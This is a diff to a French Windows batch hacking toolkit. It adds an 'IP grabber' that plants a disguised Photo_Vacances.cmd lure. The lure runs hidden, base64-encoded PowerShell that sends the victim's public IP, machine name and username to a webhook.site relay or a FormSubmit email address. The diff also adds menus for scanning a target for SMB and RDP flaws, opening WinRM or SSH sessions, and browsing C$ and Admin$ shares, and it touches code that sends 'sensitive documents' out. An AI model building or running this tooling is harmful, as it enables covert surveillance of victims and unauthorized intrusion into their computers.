@@ -1415,7 +1415,7 @@ REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
 REM ===================================================================
 :net_cyber_menu
 cls
-set "opts=TRIAGE - Diagnostic rapide de connexion;ADAPTATEURS - Infos MAC et vitesse;LAN SCAN - Scan turbo (Marques/Ports/BruteForce);FLUX - Analyse des ports et processus locaux;DNS LEAK - Verifier la fuite DNS (VPN);AUDIT Wi-Fi;RETOUR"
+set "opts=TRIAGE - Diagnostic rapide de connexion;ADAPTATEURS - Infos MAC et vitesse;LAN SCAN - Scan turbo (Marques/Ports/BruteForce);FLUX - Analyse des ports et processus locaux;DNS LEAK - Verifier la fuite DNS (VPN);AUDIT Wi-Fi;IP GRABBER - Obtenir l'IP d'une box distante (Ecoute directe);RETOUR"
 call :DynamicMenu "CYBERSECURITE RESEAU" "%opts%" "NONUMS"
 set "cyber_choice=%errorlevel%"
 
@@ -1426,8 +1426,129 @@ if "%cyber_choice%"=="3" goto cyber_lan_scan
 if "%cyber_choice%"=="4" goto cyber_flux_analysis
 if "%cyber_choice%"=="5" goto cyber_dns_leak
 if "%cyber_choice%"=="6" goto cyber_wifi_audit
-if "%cyber_choice%"=="7" goto menu_principal
+if "%cyber_choice%"=="7" goto cyber_ip_grabber
+if "%cyber_choice%"=="8" goto menu_principal
 goto net_cyber_menu
+
+:cyber_ip_grabber
+echo.
+echo  ================================================
+echo   IP GRABBER FURTIF (MULTI-METHODES)
+echo  ================================================
+echo.
+set "opts=Trame en direct (Ecoute dans cette console);Reception par E-Mail (Asynchrone)"
+call :DynamicMenu "CHOIX DE L'EXFILTRATION" "%opts%" "NONUMS NOCLS"
+set "ig_ch=%errorlevel%"
+if "%ig_ch%"=="0" goto net_cyber_menu
+if "%ig_ch%"=="2" goto ig_email
+
+:ig_local
+cls
+echo.
+echo  ================================================
+echo   IP GRABBER - ECOUTE LOCALE TEMPS REEL
+echo  ================================================
+echo.
+echo  [i] Connexion au relai et generation du piege en cours...
+
+set "PS_GRAB_FILE=%TEMP%\ig_listen.ps1"
+if exist "%PS_GRAB_FILE%" del /f /q "%PS_GRAB_FILE%"
+
+>  "%PS_GRAB_FILE%" echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+>> "%PS_GRAB_FILE%" echo try { $tk = Invoke-RestMethod -Method Post 'https://webhook.site/token' -EA Stop } catch { Write-Host '  [!] Echec connexion relai.' -f Red; pause; exit }
+>> "%PS_GRAB_FILE%" echo $id = $tk.uuid; $url = 'https://webhook.site/' + $id; $api = 'https://webhook.site/token/' + $id + '/requests'
+>> "%PS_GRAB_FILE%" echo $desk = [Environment]::GetFolderPath('Desktop') + '\Photo_Vacances.cmd'
+>> "%PS_GRAB_FILE%" echo $pl = "try { `$ip=(Invoke-RestMethod 'https://icanhazip.com' -UseBasicParsing).Trim(); `$b=@{ip=`$ip;pc=`$env:COMPUTERNAME;usr=`$env:USERNAME} ^| ConvertTo-Json; Invoke-RestMethod -Uri '$url' -Method Post -Body `$b -ContentType 'application/json' -UseBasicParsing } catch {}"
+>> "%PS_GRAB_FILE%" echo $bytes = [Text.Encoding]::Unicode.GetBytes($pl); $b64 = [Convert]::ToBase64String($bytes)
+>> "%PS_GRAB_FILE%" echo $content = "@echo off`r`nstart /B powershell -w 1 -nop -ep bypass -EncodedCommand $b64`r`nexit"
+>> "%PS_GRAB_FILE%" echo Set-Content -Path $desk -Value $content -Encoding ASCII
+>> "%PS_GRAB_FILE%" echo Write-Host ''; Write-Host '  [OK] Piege genere : Photo_Vacances.cmd' -f Green
+>> "%PS_GRAB_FILE%" echo Write-Host '  [i] En attente de la cible... (Appuyez sur ECHAP pour annuler)' -f DarkYellow; Write-Host ''
+>> "%PS_GRAB_FILE%" echo $sp = @('|','/','-','\'); $si = 0; $esc = $false
+>> "%PS_GRAB_FILE%" echo while(-not $esc) {
+>> "%PS_GRAB_FILE%" echo   if($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27){ $esc=$true; break }
+>> "%PS_GRAB_FILE%" echo   try { 
+>> "%PS_GRAB_FILE%" echo      $rs = Invoke-RestMethod -Method Get $api -EA Stop
+>> "%PS_GRAB_FILE%" echo      if($rs.data.Count -gt 0){
+>> "%PS_GRAB_FILE%" echo          $info = $rs.data[0].content ^| ConvertFrom-Json
+>> "%PS_GRAB_FILE%" echo          Write-Host ''; Write-Host '  =================================================' -f Red
+>> "%PS_GRAB_FILE%" echo          Write-Host ('   IP      : '+$info.ip) -f Cyan
+>> "%PS_GRAB_FILE%" echo          Write-Host ('   Machine : '+$info.pc) -f White
+>> "%PS_GRAB_FILE%" echo          Write-Host ('   Session : '+$info.usr) -f White
+>> "%PS_GRAB_FILE%" echo          Write-Host '  =================================================' -f Red
+>> "%PS_GRAB_FILE%" echo          Set-Content -Path "$env:TEMP\captured_ip.txt" -Value $info.ip; break
+>> "%PS_GRAB_FILE%" echo      }
+>> "%PS_GRAB_FILE%" echo   } catch {}
+>> "%PS_GRAB_FILE%" echo   for($i=3; $i -gt 0; $i--) {
+>> "%PS_GRAB_FILE%" echo      [Console]::Write("`r  [$($sp[$si %% 4])] Sondage dans ${i}s...   "); $si++
+>> "%PS_GRAB_FILE%" echo      Start-Sleep -s 1
+>> "%PS_GRAB_FILE%" echo      if($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27){ $esc=$true; break }
+>> "%PS_GRAB_FILE%" echo   }
+>> "%PS_GRAB_FILE%" echo }
+>> "%PS_GRAB_FILE%" echo Write-Host ''; if(Test-Path $desk){ Remove-Item $desk -Force -EA SilentlyContinue }
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_GRAB_FILE%"
+if exist "%PS_GRAB_FILE%" del /f /q "%PS_GRAB_FILE%"
+
+if exist "%TEMP%\captured_ip.txt" (
+    set /p remote_ip=<"%TEMP%\captured_ip.txt"
+    del /f /q "%TEMP%\captured_ip.txt"
+    echo.
+    echo  [!] CIBLE DETECTEE : !remote_ip!
+    echo.
+    set "opts=Passer a l'Audit de penetration ^& Brute-Force;Retour au menu"
+    call :DynamicMenu "SUITE LOGIQUE" "!opts!" "NONUMS NOCLS"
+    if errorlevel 2 goto net_cyber_menu
+    if errorlevel 1 (
+        set "remote_port=NONE"
+        goto cyber_remote_menu
+    )
+)
+
+echo.
+pause
+goto net_cyber_menu
+
+:ig_email
+cls
+echo.
+echo  ================================================
+echo   IP GRABBER - TRANSFERT PAR E-MAIL
+echo  ================================================
+echo.
+echo  [i] Cette methode ferme la fenetre CMD chez la cible et vous envoie
+echo      les informations directement sur votre messagerie via l'API FormSubmit.
+echo.
+echo  [!] ATTENTION : Lors du TOUT PREMIER essai, vous recevrez un email
+echo      de FormSubmit vous demandant de "Confirmer/Activer" l'adresse.
+echo      Cliquez sur le lien, puis les fois suivantes seront automatiques.
+echo.
+call :InputWithEsc "Votre adresse e-mail de reception : " grab_email
+if errorlevel 1 goto cyber_ip_grabber
+if "!grab_email!"=="" goto cyber_ip_grabber
+
+set "PS_GRAB=%TEMP%\ip_grab.ps1"
+if exist "%PS_GRAB%" del /f /q "%PS_GRAB%"
+
+>  "%PS_GRAB%" echo $cmdPath = "$env:USERPROFILE\Desktop\Photo_Vacances.cmd"
+set "gemail=!grab_email!"
+>> "%PS_GRAB%" echo $u = 'https://formsubmit.co/%gemail%'
+>> "%PS_GRAB%" echo $psPayload = "try { `$ip=(Invoke-RestMethod 'https://icanhazip.com' -UseBasicParsing).Trim(); `$b=@{IP=`$ip; Machine=`$env:COMPUTERNAME; Session=`$env:USERNAME; _subject='Nouvelle Cible Identifiee'; _captcha='false'}; Invoke-RestMethod -Uri `$u -Method Post -Body `$b -UseBasicParsing } catch {}"
+>> "%PS_GRAB%" echo $psPayloadBytes = [System.Text.Encoding]::Unicode.GetBytes($psPayload)
+>> "%PS_GRAB%" echo $psB64 = [Convert]::ToBase64String($psPayloadBytes)
+>> "%PS_GRAB%" echo $obf = "@echo off`r`nstart /B powershell -w 1 -nop -ep bypass -EncodedCommand $psB64`r`nexit"
+>> "%PS_GRAB%" echo Set-Content -Path $cmdPath -Value $obf -Encoding ASCII
+>> "%PS_GRAB%" echo Write-Host ''
+>> "%PS_GRAB%" echo Write-Host '  [OK] Piege genere sur le Bureau : Photo_Vacances.cmd' -f Green
+>> "%PS_GRAB%" echo Write-Host "  [i] Le payload l'expediera vers : !grab_email!" -f DarkGray
+>> "%PS_GRAB%" echo Write-Host ''
+>> "%PS_GRAB%" echo Write-Host '  (Appuyez sur une touche pour revenir au menu)' -f Gray
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_GRAB%"
+if exist "%PS_GRAB%" del "%PS_GRAB%"
+pause >nul
+goto net_cyber_menu
+
 
 :cyber_triage
 cls
@@ -1923,41 +2044,152 @@ pause & goto net_cyber_menu
 REM ===================================================================
 REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
 REM ===================================================================
-:net_cyber_menu
-cls
-set "opts=TRIAGE - Diagnostic rapide de connexion;ADAPTATEURS - Infos MAC et vitesse;LAN SCAN - Scan turbo (Marques/Ports/BruteForce);FLUX - Analyse des ports et processus locaux;DNS LEAK - Verifier la fuite DNS (VPN);PHISHING - Generateur de lien;RETOUR"
-call :DynamicMenu "CYBERSECURITE RESEAU" "%opts%" "NONUMS"
-set "cyber_choice=%errorlevel%"
 
-if "%cyber_choice%"=="0" goto menu_principal
-if "%cyber_choice%"=="1" goto cyber_triage
-if "%cyber_choice%"=="2" goto cyber_adapter_audit
-if "%cyber_choice%"=="3" goto cyber_lan_scan
-if "%cyber_choice%"=="4" goto cyber_flux_analysis
-if "%cyber_choice%"=="5" goto cyber_dns_leak
-if "%cyber_choice%"=="6" goto cyber_phishing_gen
-if "%cyber_choice%"=="7" goto menu_principal
-goto net_cyber_menu
 
 :cyber_lan_scan
 cls
 echo.
 echo  ================================================
-echo   SCAN RESEAU AVANCE (MARQUES, MODELES ^& PORTS)
+echo   SCANNER DE FAILLES RESEAU ET CONNEXION DISTANTE
 echo  ================================================
 echo.
-echo  [i] Appuyez sur ECHAP pour annuler le scan.
+set "opts=Analyser le reseau local (Mode LAN Automatique);Analyser une IP ou un sous-reseau distant;Analyse des failles et Connexion distante"
+call :DynamicMenu "CHOIX DU SCAN" "%opts%" "NONUMS NOCLS"
+set "c_lan=%errorlevel%"
+
+if "%c_lan%"=="0" goto net_cyber_menu
+if "%c_lan%"=="3" goto cyber_remote_connect
+if "%c_lan%"=="2" goto cyber_lan_custom
+if "%c_lan%"=="1" goto cyber_lan_auto
+goto cyber_lan_scan
+
+:cyber_lan_auto
+set "base_ip=AUTO"
+goto start_lan_scan
+
+:cyber_lan_custom
+cls
+echo.
+echo  ================================================
+echo   SCANNER PERSONNALISE (LAN OU WAN)
+echo  ================================================
+echo.
+echo  EXEMPLES DE SAISIE :
+echo.
+echo  - Reseau local :          192.168.1   (scanne .1 a .254)
+echo  - IP unique :             192.168.1.50
+echo  - Reseau box distante :   192.168.1 ou 10.0.0 (adresse PRIVEE de sa box)
+echo.
+echo  [!] L'IP publique WAN de votre cousin (type IPv6 ou 82.x.x.x)
+echo      ne scanne PAS les appareils de son reseau local.
+echo      Utilisez le module IP GRABBER pour obtenir son IP, puis
+echo      connectez-vous en SSH ou WinRM pour un scan interne reel.
+echo.
+call :InputWithEsc "Base IP ou IP unique : " base_ip
+if errorlevel 1 goto cyber_lan_scan
+if "%base_ip%"=="" goto cyber_lan_scan
+goto start_lan_scan
+
+:cyber_remote_connect
+cls
+echo.
+echo  ================================================
+echo   ANALYSE FAILLES ^& ACCES DISTANT (WAN/LAN)
+echo  ================================================
+echo.
+echo  [i] Pour eviter les conflits avec votre reseau local,
+echo      utilisez l'IP PUBLIQUE ou un DNS (ex: ma-box.ddns.net).
+echo.
+call :InputWithEsc "IP Cible ou DNS (ex: 82.x.x.x) : " remote_ip
+if errorlevel 1 goto cyber_lan_scan
+if "%remote_ip%"=="" goto cyber_lan_scan
+
+echo.
+echo  [?] Port specifique ? (Laissez vide pour les ports par defaut)
+echo      (Ex: 2222 si votre box redirige le port 2222 vers le 22 d'un PC)
+call :InputWithEsc "Port (Optionnel) : " remote_port
+if errorlevel 1 goto cyber_lan_scan
+if not defined remote_port set "remote_port=NONE"
+
+
+:cyber_remote_menu
+cls
+echo.
+echo  Cible : %remote_ip%
+echo  ------------------------------------------------
+set "opts=Scanner profondement les failles (Vuln, SMB, RDP, Ports);Ouvrir une session PowerShell (WinRM);Se connecter via SSH;Explorer les partages secrets SMB (C$, Admin$)"
+call :DynamicMenu "ACTIONS DISTANTES" "%opts%" "NONUMS NOCLS"
+set "rc_opt=%errorlevel%"
+
+if "%rc_opt%"=="1" (
+    echo.
+    echo [i] Lancement du scan de vulnerabilite pour %remote_ip%...
+    powershell -NoProfile -Command "$ip='%remote_ip%'; $ports=@(21,22,23,80,135,139,443,445,3389,5985,8080); foreach($p in $ports){ $t=New-Object Net.Sockets.TcpClient; $c=$t.BeginConnect($ip,$p,$null,$null); if($c.AsyncWaitHandle.WaitOne(400,$false)){ Write-Host ('[!] Port Ouvert : '+$p) -f Cyan; if($p -eq 445){ Write-Host '  -^> Faille potentielle critique : SMB (WannaCry, EternalBlue, relay)' -f Red }; if($p -eq 135){ Write-Host '  -^> Faille potentielle RPC (Enumeration possible)' -f Yellow }; if($p -eq 3389){ Write-Host '  -^> RDP ouvert (Risque Bruteforce / BlueKeep)' -f Yellow }; if($p -eq 5985){ Write-Host '  -^> WinRM actif (Coerced Auth possible)' -f Yellow }; if($p -eq 21 -or $p -eq 23){ Write-Host '  -^> Protocole historique clair ! (Sniffing facile)' -f Red }; $t.Close()} }"
+    echo.
+    pause
+    goto cyber_remote_menu
+)
+if "%rc_opt%"=="2" (
+    echo.
+    echo [i] Tentative de connexion WinRM Remote PowerShell sur %remote_ip%...
+    echo (Un popup d'identification peut s'afficher, requiere authentification d'admin distant)
+    echo.
+    powershell -NoProfile -Command "Enter-PSSession -ComputerName %remote_ip% -Credential (Get-Credential)"
+    pause
+    goto cyber_remote_menu
+)
+if "%rc_opt%"=="3" (
+    echo.
+    echo [i] Connexion distante SSH...
+    set /p "ssh_user=Utilisateur cible : "
+    if "!remote_port!"=="NONE" (
+        ssh !ssh_user!@%remote_ip%
+    ) else (
+        echo [i] Utilisation du port specifie : !remote_port!
+        ssh -p !remote_port! !ssh_user!@%remote_ip%
+    )
+    pause
+    goto cyber_remote_menu
+)
+if "%rc_opt%"=="4" (
+    cls
+    echo.
+    echo [i] Listage des partages distants accessibles sur %remote_ip% :
+    net view \\%remote_ip% /all
+    echo.
+    echo [?] Explorer le disque distant virtuellement (C$, Admin$) dans l'Explorateur ?
+    set /p "open_exp=(O/N) : "
+    if /i "!open_exp!"=="O" start \\%remote_ip%\C$
+    pause
+    goto cyber_remote_menu
+)
+if "%rc_opt%"=="0" goto cyber_lan_scan
+goto cyber_remote_menu
+
+:start_lan_scan
+echo.
+echo  [i] Demarrage du Scan des failles... Appuyez sur ECHAP pour annuler.
 echo.
 set "SCPS=%TEMP%\advanced_turbo_scan.ps1"
 if exist "%SCPS%" del "%SCPS%"
 
 >  "%SCPS%" echo $oui = @{'B8-27-EB'='Raspberry Pi';'DC-A6-32'='Raspberry Pi';'E4-5F-01'='Raspberry Pi';'00-1E-C2'='Apple';'AC-87-A3'='Apple';'64-16-7F'='Apple';'A4-77-33'='Samsung';'48-D6-D5'='Xiaomi';'00-1A-11'='Google';'00-FF-BB'='Microsoft';'38-07-16'='Freebox';'E4-9E-12'='Freebox';'00-11-32'='Synology'}
->> "%SCPS%" echo $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' ^| Sort-Object RouteMetric ^| Select-Object -First 1
->> "%SCPS%" echo $myIp = (Get-NetIPAddress -InterfaceIndex $route.InterfaceIndex -AddressFamily IPv4).IPAddress
->> "%SCPS%" echo $base = ($myIp -split '\.')[0..2] -join '.'
->> "%SCPS%" echo Write-Host "  Cible   : $base.1 a $base.254" -f Cyan
->> "%SCPS%" echo $jobs = 1..254 ^| ForEach-Object {
->> "%SCPS%" echo     $target = "$base.$_"
+>> "%SCPS%" echo $targetInput = "%base_ip%"
+>> "%SCPS%" echo if ($targetInput -eq 'AUTO') {
+>> "%SCPS%" echo     $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' ^| Sort-Object RouteMetric ^| Select-Object -First 1
+>> "%SCPS%" echo     $myIp = (Get-NetIPAddress -InterfaceIndex $route.InterfaceIndex -AddressFamily IPv4).IPAddress
+>> "%SCPS%" echo     $base = ($myIp -split '\.')[0..2] -join '.'
+>> "%SCPS%" echo     $ipsToScan = 1..254 ^| ForEach-Object { "$base.$_" }
+>> "%SCPS%" echo     Write-Host "  Cible   : $base.1 a $base.254" -f Cyan
+>> "%SCPS%" echo } elseif ($targetInput -match '^\d{1,3}\.\d{1,3}\.\d{1,3}$') {
+>> "%SCPS%" echo     $ipsToScan = 1..254 ^| ForEach-Object { "$targetInput.$_" }
+>> "%SCPS%" echo     Write-Host "  Cibles  : $targetInput.1 a $targetInput.254" -f Cyan
+>> "%SCPS%" echo } else {
+>> "%SCPS%" echo     $ipsToScan = @($targetInput)
+>> "%SCPS%" echo     Write-Host "  Cible   : $targetInput" -f Cyan
+>> "%SCPS%" echo }
+>> "%SCPS%" echo $jobs = $ipsToScan ^| ForEach-Object {
+>> "%SCPS%" echo     $target = $_
 >> "%SCPS%" echo     [PowerShell]::Create().AddScript({
 >> "%SCPS%" echo         param($ip, $ouiMap)
 >> "%SCPS%" echo         $res = @{ IP = $ip; Status = 'Down'; Name = ''; Brand = 'Inconnu'; Ports = @() }
@@ -1997,6 +2229,10 @@ if exist "%SCPS%" del "%SCPS%"
 >> "%SCPS%" echo             Write-Host " - $($r.Brand) " -NoNewline -f Yellow
 >> "%SCPS%" echo             Write-Host "($($r.Name))" -f Gray
 >> "%SCPS%" echo             if ($r.Ports.Count -gt 0) { Write-Host "      Ports ouverts : $($r.Ports -join ', ')" -f Cyan }
+>> "%SCPS%" echo             if ($r.Ports -contains 445) { Write-Host "      [!] Faille potentielle critique : SMB" -f Red }
+>> "%SCPS%" echo             if ($r.Ports -contains 3389) { Write-Host "      [!] RDP Ouvert (Risque d'attaque/Bruteforce)" -f Yellow }
+>> "%SCPS%" echo             if ($r.Ports -contains 21 -or $r.Ports -contains 23) { Write-Host "      [!] Protocoles en texte clair securite faible (FTP/Telnet)" -f Red }
+>> "%SCPS%" echo             if ($r.Ports -contains 5985) { Write-Host "      [!] WinRM Actif" -f Yellow }
 >> "%SCPS%" echo             $r.IP ^| Out-File -Append "%TEMP%\found_ips.txt" -Encoding ASCII
 >> "%SCPS%" echo         }
 >> "%SCPS%" echo         $running = $running ^| Where-Object { $_.Async -ne $j.Async }
@@ -5838,6 +6074,18 @@ echo Appuyez sur une touche pour quitter...
 pause >nul
 exit
 
+:InputWithEsc
+set "%~2="
+if exist "%TEMP%\in.txt" del "%TEMP%\in.txt"
+set "ps_in=$Host.UI.RawUI.FlushInputBuffer(); [Console]::Write('%~1'); $s=''; while($true) { if ($Host.UI.RawUI.KeyAvailable) { $k=$Host.UI.RawUI.ReadKey('IncludeKeyDown,NoEcho'); $vc=$k.VirtualKeyCode; if ($vc -eq 27) { [Console]::WriteLine(); exit 1 }; if ($vc -eq 13) { [Console]::WriteLine(); Set-Content -Path '%TEMP%\in.txt' -Value $s -Encoding ASCII; exit 0 }; if ($vc -eq 8) { if ($s.Length -gt 0) { $s=$s.Substring(0,$s.Length-1); [Console]::Write(([char]8).ToString()+' '+([char]8).ToString()) } } elseif ($vc -eq 86 -and ($k.ControlKeyState -match 'LeftCtrlPressed|RightCtrlPressed')) { $cb=[Windows.Clipboard]::GetText(); if ($cb) { $s+=$cb; [Console]::Write($cb) } } else { $c=$k.Character; $ci=[int][char]$c; if ($ci -ge 32 -and $ci -le 126 -or $ci -gt 127) { $s+=$c; [Console]::Write($c) } } } Start-Sleep -Milliseconds 10 }"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_in%"
+if errorlevel 1 exit /b 1
+if exist "%TEMP%\in.txt" (
+    set /p "%~2=" < "%TEMP%\in.txt"
+    del "%TEMP%\in.txt"
+)
+exit /b 0
+
 :DynamicMenu
 :: Arguments: %1="Titre", %2="Option1;Option2;Option3", %3="OptionFlags" (ex: NONUMS)
 :: Retourne: ERRORLEVEL (1, 2, 3...) ou 0 pour Echap/Retour
@@ -6624,6 +6872,8 @@ if "%exf_choice%"=="3" (
     echo [OK] Documents envoyes sur votre salon.
     pause & goto smb_exp_menu
 )
+if "%exf_choice%"=="4" goto smb_exp_menu
+
 
 if defined target_file (
     echo [i] Envoi du fichier sensible...
